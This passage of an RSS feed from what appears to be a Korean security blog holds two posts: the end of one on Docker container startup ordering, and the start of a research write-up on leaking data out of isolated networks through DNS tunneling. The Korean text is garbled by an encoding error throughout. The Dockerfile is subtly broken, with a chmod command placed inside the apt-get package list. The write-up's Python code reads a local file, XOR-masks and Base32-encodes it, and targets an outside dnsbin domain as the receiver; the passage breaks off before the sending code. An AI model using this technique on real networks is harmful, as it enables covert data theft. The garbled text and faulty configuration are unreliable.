&lt;p&gt;Docker API ë¬¸ì„œì—ë„ í•´ë‹¹ ë¬¸ì œëŠ” ì´ìŠˆë¡œ ë“±ë¡ë˜ì–´ ìˆì—ˆìŠµë‹ˆë‹¤. í˜„ì¬ ê²€ì¦ëœ í•´ê²°ë°©ë²•ìœ¼ë¡œëŠ” â€œ&lt;a href=&quot;https://github.com/vishnubob/wait-for-it.git&quot;&gt;wait-for-it&lt;/a&gt;â€ ìŠ¤í¬ë¦½íŠ¸ íŒŒì¼ ë˜ëŠ” â€œ&lt;a href=&quot;https://github.com/jwilder/dockerize.git&quot;&gt;dockerize&lt;/a&gt;â€  ë°”ì´ë„ˆë¦¬ íŒŒì¼ì„ í†µí•˜ì—¬ í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ê°€ ì •ìƒì ìœ¼ë¡œ êµ¬ë™ë  ë•Œ ê¹Œì§€ Sleep Timeoutì„ ì„¤ì •í•˜ì—¬ ì •ìƒì ìœ¼ë¡œ êµ¬ë™ë˜ë©´ í•´ë‹¹ ì»¨í…Œì´ë„ˆë¥¼ ë™ì‘ ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë³´ë‹¤ ìì„¸í•œ ì‚¬ìš©ë²•ì€ ì•„ë˜ bot_Dockerfileì—ì„œ ì„¤ëª…ë“œë¦¬ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-docker highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ubuntu:18.04&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;useradd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bot aaaa&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/sbin/nologin&quot;&lt;/span&gt; raon_bot

&lt;span class=&quot;k&quot;&gt;WORKDIR&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; /home/raon_bot&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./src/* /home/raon_bot/bot/&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./supervisord.conf /etc/supervisor/conf.d/supervisord.conf&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./wait-for-it.sh /sbin/wait-for-it.sh&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt-get update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# Debug Tool&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# apt-get install --no-install-recommends -y git vim supervisor \&lt;/span&gt;
    apt-get install --no-install-recommends -y supervisor \
    python3-minimal \
    python3-pip \
    chmod 700 /sbin/wait-for-it.sh

&lt;span class=&quot;c&quot;&gt;# Wait for DB Container í™œì„±í™”í›„ MySQL Process ëŒ€ê¸°&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; [ &quot;/sbin/wait-for-it.sh&quot;, &quot;-h&quot;, &quot;apache_web&quot;, &quot;-p&quot;, &quot;80&quot;, &quot;--&quot;, &quot;/usr/bin/supervisord&quot;, &quot;-c&quot;, &quot;/etc/supervisor/conf.d/supervisord.conf&quot; ]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bot_Dockerfile&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ì‚¬ìš©ëœ ì¸ìë¥¼ ì‚´í´ë³´ë©´ â€œ&lt;code class=&quot;highlighter-rouge&quot;&gt;/sbin/wait-for-it.sh -h apache_web -p 80 â€” /usr/bin/supervisord -c '/etc/supervisor/conf.d/supervisord.conf&lt;/code&gt;â€œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰ hostì¸ â€œapache_webâ€ ì»¨í…Œì´ë„ˆì˜ 80ë²ˆ í¬íŠ¸ë¡œ í†µì‹ ì„ í•˜ë©°, ì •ìƒì ìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ê°€ êµ¬ë™ë˜ì–´ í†µì‹ ì´ ë  ì‹œ â€œâ€”â€ ì˜µì…˜ì„ í†µí•´ Supervisor í”„ë¡œì„¸ìŠ¤ë¥¼ êµ¬ë™ì‹œí‚¤ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë˜í•œ Bot Dockerfileë¥¼ ìµœì í™” ì‘ì—…ì„ ì§„í–‰í•˜ì˜€ìœ¼ë©°, ìµœì í™”ë¥¼ ì§„í–‰í•˜ê¸°ì „ ë„ì»¤ í—ˆë¸Œì— ì˜¬ë¼ì˜¨ chromedriver ì´ë¯¸ì§€ì˜ ìš©ëŸ‰ì´ ëŒ€ëµ &lt;strong&gt;1.4&lt;/strong&gt;GB ì •ë„ ë¶ˆí•„ìš”í•œ ë°ì´í„°ê°€ ë§ì•„ ì§ì ‘ &lt;strong&gt;chromedriver&lt;/strong&gt; ì´ë¯¸ì§€ë¥¼ ì œì‘ í•˜ì˜€ìœ¼ë©° ìš©ëŸ‰ì€ 602MBë¡œ ì¶•ì†Œ ì‹œì¼°ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;supervisord]
&lt;span class=&quot;nv&quot;&gt;nodaemon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/raon_bot/bot/log/supervisord.log
&lt;span class=&quot;nv&quot;&gt;pidfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/raon_bot/bot/log/supervisord.pid

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;program:bot]
&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/bin/python3 /home/raon_bot/bot/bot.py
&lt;span class=&quot;nv&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/raon_bot/
&lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;raon_bot
&lt;span class=&quot;nv&quot;&gt;stdout_logfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/raon_bot/bot/log/bot.log
&lt;span class=&quot;nv&quot;&gt;stderr_logfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/raon_bot/bot/log/bot_error.log
&lt;span class=&quot;nv&quot;&gt;autostart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;autorestart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;supervisord.conf&lt;/p&gt;

&lt;p&gt;í˜„ì¬ ì»¨í…Œì´ë„ˆì™€ í”„ë¡œì„¸ìŠ¤ë¥¼ ì•ˆì •ì„±ì„ ë†’ì´ê¸° ìœ„í•´ â€œwait-for-it.shâ€ â†’ â€œsupervisorâ€ â†’ â€œcontainer restartâ€ ìˆœì„œëŒ€ë¡œ ê° ë‹¨ê³„ë³„ í”„ë¡œì„¸ìŠ¤ë¥¼ ì²´í¬í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ ë˜ëŠ” ì»¨í…Œì´ë„ˆê°€ ë¹„ì •ìƒ ì¢…ë£Œì‹œ ìë™ìœ¼ë¡œ ì¼œì£¼ë„ë¡ ì„¤ì •í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-05-01/Dockerfile-Docker-Compose-Project</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-01/Dockerfile-Docker-Compose-Project</guid>
        
        <category>programming</category>
        
        <category>docker</category>
        
        
      </item>
    
      <item>
        <title>DNS Tunnelingì„ í†µí•œ ì •ë³´ ìœ ì¶œ</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœê·œë²”&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;ëª©ì°¨&lt;/strong&gt;&lt;/p&gt;

    &lt;hr /&gt;

    &lt;hr /&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ê°œìš”&quot;&gt;ê°œìš”&lt;/h3&gt;

&lt;p&gt;ì¸í„°ë„· ì ‘ì†ì´ ì•ˆë˜ëŠ” ë‚´ë¶€ë§ í™˜ê²½ì—ì„œ, ë‹¤ì–‘í•œ ë³´ì•ˆ ì†”ë£¨ì…˜ì´ ì„¤ì¹˜ë˜ì—ˆì–´ë„,
ê³¼ì—°, ì •ë³´ ìœ ì¶œì˜ ìœ„í˜‘ìœ¼ë¡œ ë¶€í„° ì•ˆì „í• ê¹Œìš”?&lt;/p&gt;

&lt;p&gt;DNS Tunneling ê¸°ë²•ì„ í™œìš©í•˜ì—¬ ìœ„ì™€ ê°™ì€ í™˜ê²½ì—ì„œ ì •ë³´ ìœ ì¶œì´ ê°€ëŠ¥í•œì§€ í…ŒìŠ¤íŠ¸í•´ë³´ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;dns-tunneling&quot;&gt;DNS Tunneling&lt;/h3&gt;

&lt;p&gt;DNS í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ì„ì˜ ë°ì´í„°ë¥¼ ì†¡ìˆ˜ì‹ í•˜ëŠ” ê¸°ìˆ ì„ DNS Tunnelingì´ë¼ê³  í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì‹¤ì œë¡œ ë§ì€ ì•…ì„±ì½”ë“œê°€ ì›ê²© ëª…ë ¹ì§€ ì„œë²„ì™€ í†µì‹ í•  ë•Œ DNS Tunnelingì„ ì•…ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/55daf833-d832-4e6a-8182-f78cb29bbda9/0b681e3d-c7f7-468a-94b5-a69801ddf46b.png&quot; alt=&quot;/assets/55daf833-d832-4e6a-8182-f78cb29bbda9/0b681e3d-c7f7-468a-94b5-a69801ddf46b.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ê·¸ ì´ìœ ëŠ” ë‚´ë¶€ë§ í™˜ê²½ ë˜ëŠ” íŠ¹ì • Outbound í¬íŠ¸ë§Œ í—ˆìš©ë˜ëŠ” í™˜ê²½ì—ì„œë„, DNS íŠ¸ë˜í”½ ì†¡ì‹ ì´ í—ˆìš©ë˜ëŠ” ê²½ìš°ê°€ ë¹ˆë²ˆí•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/8d3b6cad-8833-4398-9c11-2499aa7ba03b/fa591cf7-266f-40c6-b901-d813de4ecb95.png&quot; alt=&quot;/assets/8d3b6cad-8833-4398-9c11-2499aa7ba03b/fa591cf7-266f-40c6-b901-d813de4ecb95.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ê³µê²©ìê°€ ì„¤ì¹˜í•œ ì„ì˜ DNS ì„œë²„ì˜ íŠ¹ì • ì„œë¸Œ ë„ë©”ì¸ì„ ì¡°íšŒí•©ë‹ˆë‹¤.
í•´ë‹¹ DNS íŒ¨í‚·ì—ì„œ ì„œë¸Œ ë„ë©”ì¸ ì •ë³´(â€˜leakeddataâ€™)ë§Œ êµ¬ë³„í•˜ì—¬ ì •ë³´ë¥¼ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ìœ ì¶œ-í…ŒìŠ¤íŠ¸&quot;&gt;ìœ ì¶œ í…ŒìŠ¤íŠ¸&lt;/h3&gt;

&lt;p&gt;DNS Tunneling êµ¬í˜„ì„ ìœ„í•´ì„œëŠ” DNS ì„œë²„ êµ¬ì¶•ì´ í•„ìš”í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Pythonì„ ì‚¬ìš©í•˜ì—¬ DNS Tunneling êµ¬í˜„&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; [https://github.com/ialexryan/Burrow-Server](https://github.com/ialexryan/Burrow-Server)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pythonì„ ì‚¬ìš©í•˜ì—¬ êµ¬ì¶•í•  ìˆ˜ ìˆëŠ” Github í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì˜€ìœ¼ë‚˜, ì—¬ëŸ¬ ì¶”ê°€ ì‘ì—…ì´ í•„ìš”í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/ca576997-b4d8-4c2d-8a2f-3f069cbeb5fc/924c39e7-e437-4cfe-9ed2-fa852a6f5294.png&quot; alt=&quot;/assets/ca576997-b4d8-4c2d-8a2f-3f069cbeb5fc/924c39e7-e437-4cfe-9ed2-fa852a6f5294.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì‰¬ìš´ ë°©ë²•ì„ ì°¾ë˜ ì¤‘, CTFì—ì„œë„ í™œìš©ë˜ëŠ” DNSBin(http://dnsbin.zhack.ca/) í˜ì´ì§€ë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/a4c1412c-c001-475b-b52f-c8cd7303d8a2/82361422-e8d7-49d1-b0f7-5151fa0faa9d.png&quot; alt=&quot;/assets/a4c1412c-c001-475b-b52f-c8cd7303d8a2/82361422-e8d7-49d1-b0f7-5151fa0faa9d.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/05830fe9-e5d6-4dc1-b41b-ca518de63374/4b25fd46-25c7-40b6-90a5-a10cfc883d74.png&quot; alt=&quot;/assets/05830fe9-e5d6-4dc1-b41b-ca518de63374/4b25fd46-25c7-40b6-90a5-a10cfc883d74.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì‹ë³„ ê°€ëŠ¥í•œ íŠ¹ì • ì„œë¸Œ ë„ë©”ì¸ì´ ì£¼ì–´ì§€ê³ , í•´ë‹¹ ë„ë©”ì¸ ì•ì— ì„ì˜ ë°ì´í„°ë¥¼ ë¶™ì—¬ì„œ ë³´ë‚´ë©´
ì„œë²„ì—ì„œ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë„ë©”ì¸ ì´ë¦„ ê·œì¹™ ìƒ ëŒ€ì†Œë¬¸ì êµ¬ë¶„ì´ ì—†ì§€ë§Œ, í•´ë‹¹ ì‚¬ì´íŠ¸ì—ì„œëŠ” ì´ë¥¼ êµ¬ë¶„í•˜ì—¬ ë³´ì—¬ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;í…ŒìŠ¤íŠ¸-ì½”ë“œì†¡ì‹ &quot;&gt;í…ŒìŠ¤íŠ¸ ì½”ë“œ(ì†¡ì‹ )&lt;/h3&gt;

&lt;p&gt;ì•„ë˜ ë‚´ìš©ì„ í†µí•´ ì†¡ì‹  í…ŒìŠ¤íŠ¸ ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ë„ë©”ì¸ ì´ë¦„ ê·œì¹™ ìƒ í—ˆìš©ë˜ëŠ” 63ê°œ ë¬¸ì ì¤‘, í•˜ì´í”ˆ(-)ì„ ì œì™¸í•œ 62ê°œ ë¬¸ìë¡œ êµ¬ì„±&lt;/li&gt;
  &lt;li&gt;Raw Dataë¥¼ ë³´ë‚´ê¸° ìœ„í•´ì„œ ì¸ì½”ë”©ì´ í•„ìš”í•˜ë¯€ë¡œ, ê°„ë‹¨íˆ ì“¸ ìˆ˜ ìˆëŠ” Base32ë¥¼ ì‚¬ìš©
(Base62ë¥¼ ì‚¬ìš©í•˜ê³  ì‹¶ìœ¼ë‚˜, ì •ìˆ˜í˜•ìœ¼ë¡œ ì¸ìë¥¼ ë°›ê¸° ë•Œë¬¸ì— ë³µì¡í•˜ì˜€ìŠµë‹ˆë‹¤.)&lt;/li&gt;
  &lt;li&gt;Dnsbinì—ì„œ ì¤‘ë³µ ë°ì´í„°ë¥¼ í‘œì‹œí•˜ì§€ ì•Šìœ¼ë¯€ë¡œ, ì¤‘ë³µì„ í”¼í•˜ê¸° ìœ„í•´ ê°„ë‹¨í•œ ì•”í˜¸í™” í•„ìš”&lt;/li&gt;
  &lt;li&gt;ë„ë©”ì¸ì€ ìµœëŒ€ 253 ê¸€ì, ë¼ë²¨ì€ 63ê¸€ìë¡œ êµ¬ì„±ë˜ë¯€ë¡œ ì•Œë§ê²Œ  ì˜ë¼ì„œ ì†¡ì‹ &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rand_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getrandbits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./test.dat&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data Size(Org) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b32encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Change pad
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size_enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data Size(Enc) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;base_domain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'.9b14918384f099f6b54a.d.zhack.ca'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;253&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Max Length 253
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &quot;.&quot;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

